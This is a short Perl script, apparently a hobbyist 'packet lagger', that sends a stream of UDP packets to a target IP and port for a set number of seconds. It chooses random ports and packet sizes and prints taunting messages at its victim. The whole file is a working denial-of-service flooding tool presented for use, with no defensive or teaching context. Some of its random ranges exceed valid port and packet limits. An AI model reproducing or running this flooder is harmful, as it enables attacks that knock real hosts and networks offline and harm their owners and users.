#!/usr/bin/perl

##
# PwNy<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

EOTEXT

print " Lagging $ip " . ($port ? $port : "random") . " 
SENDING  " .
  ($size ? "Small Packets" : "QUIT BITCHING CAUSE YOU JUST GOT FRYED!!?") . " 
ATTACKING FOR " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}

